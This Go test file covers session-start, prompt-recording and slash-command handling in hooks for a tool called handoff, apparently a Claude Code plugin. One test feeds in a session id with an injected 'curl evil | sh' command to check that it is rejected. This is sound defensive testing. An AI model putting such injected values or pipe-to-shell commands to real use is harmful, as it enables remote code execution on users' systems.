package hook

import (
	"bytes"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/nicholas1513/handoff/internal/queue"
)

const sid = "0b6c2a8e-1f3d-4c55-9a7e-2d4f6b8c0e12"

func TestSessionStart(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	env := filepath.Join(t.TempDir(), "env")
	os.WriteFile(env, []byte("export OTHER=1\n"), 0o600)
	in := `{"session_id":"` + sid + `","cwd":"/src","transcript_path":"/t.jsonl","source":"startup"}`
	if err := SessionStart(q, strings.NewReader(in), env); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(env)
	if string(b) != "export OTHER=1\nexport HANDOFF_SESSION_ID="+sid+"\n" {
		t.Fatalf("env file = %q", b)
	}
	if s, err := q.ReadSession(sid); err != nil || s.Cwd != "/src" || s.Source != "startup" {
		t.Fatalf("session = %+v %v", s, err)
	}
	// The sandbox can write only inside queue/, so it can't create it; the hook must.
	if fi, err := os.Stat(filepath.Join(q.Root, "queue")); err != nil || !fi.IsDir() {
		t.Fatalf("queue dir not created: %v", err)
	}
}

// Claude Code may not provide CLAUDE_ENV_FILE to plugin hooks; the session record still matters.
func TestSessionStartWithoutEnvFile(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	in := `{"session_id":"` + sid + `","cwd":"/src"}`
	if err := SessionStart(q, strings.NewReader(in), ""); err != nil {
		t.Fatalf("SessionStart without env file: %v", err)
	}
	if _, err := q.ReadSession(sid); err != nil {
		t.Fatal(err)
	}
}

func TestSessionStartRejectsInjection(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	env := filepath.Join(t.TempDir(), "env")
	in := `{"session_id":"x; curl evil | sh","cwd":"/src"}`
	if err := SessionStart(q, strings.NewReader(in), env); err == nil {
		t.Fatal("unsafe session id accepted")
	}
	if b, _ := os.ReadFile(env); len(b) != 0 {
		t.Fatalf("env file written: %q", b)
	}
}

// Background-task notifications arrive through UserPromptSubmit too, but they aren't the human's
// words; recording them would show a chained item's provenance as the previous item's output.
func TestPromptSkipsTaskNotifications(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	Prompt(q, strings.NewReader(`{"session_id":"`+sid+`","prompt":"build the dashboard"}`), io.Discard)
	time.Sleep(time.Millisecond)
	note := `{"session_id":"` + sid + `","prompt":"  <task-notification>\n<task-id>x</task-id>\n</task-notification>"}`
	if err := Prompt(q, strings.NewReader(note), io.Discard); err != nil {
		t.Fatal(err)
	}
	p, err := q.PromptBefore(sid, time.Now())
	if err != nil || p.Prompt != "build the dashboard" {
		t.Fatalf("prompt = %+v %v, want the human's prompt", p, err)
	}
}

func TestPrompt(t *testing.T) {
	q := &queue.Queue{Root: t.TempDir()}
	in := `{"session_id":"` + sid + `","prompt":"make the dashboard\nplease"}`
	var out bytes.Buffer
	if err := Prompt(q, strings.NewReader(in), &out); err != nil {
		t.Fatal(err)
	}
	if out.Len() != 0 { // stdout would be injected into Claude's context
		t.Fatalf("stdout = %q", out.String())
	}
	p, err := q.PromptBefore(sid, time.Now())
	if err != nil || p.Prompt != "make the dashboard\nplease" {
		t.Fatalf("prompt = %+v %v", p, err)
	}
}

// /handoff:claude-sessions is answered by the hook and blocked, so Claude never sees it; it isn't the agent's
// provenance either, so it isn't recorded.
func TestSessionsCommandAnsweredByTheHook(t *testing.T) {
	var args []string
	old := runSessions
	runSessions = func(q *queue.Queue, arg string, now time.Time) string {
		args = append(args, arg)
		return "saved 1 window · 2 sessions"
	}
	t.Cleanup(func() { runSessions = old })
	q := &queue.Queue{Root: t.TempDir()}
	for _, p := range []string{"/handoff:claude-sessions save", "  /claude-sessions restore\\n", "/handoff:claude-sessions"} {
		var out bytes.Buffer
		if err := Prompt(q, strings.NewReader(`{"session_id":"`+sid+`","prompt":"`+p+`"}`), &out); err != nil {
			t.Fatal(err)
		}
		var got map[string]string
		if err := json.Unmarshal(out.Bytes(), &got); err != nil || got["decision"] != "block" || got["reason"] != "saved 1 window · 2 sessions" {
			t.Fatalf("%q: stdout = %q", p, out.String())
		}
	}
	if want := []string{"save", "restore", ""}; strings.Join(args, ",") != strings.Join(want, ",") {
		t.Fatalf("args = %q, want %q", args, want)
	}
	if _, err := q.PromptBefore(sid, time.Now()); err == nil {
		t.Fatal("the command was recorded as the agent's prompt")
	}
	// Anything else is an ordinary prompt: recorded, and nothing on stdout.
	var out bytes.Buffer
	Prompt(q, strings.NewReader(`{"session_id":"`+sid+`","prompt":"/handoff:claude-sessionsave"}`), &out)
	if out.Len() != 0 || len(args) != 3 {
		t.Fatalf("a near miss was handled: stdout=%q", out.String())
	}
}
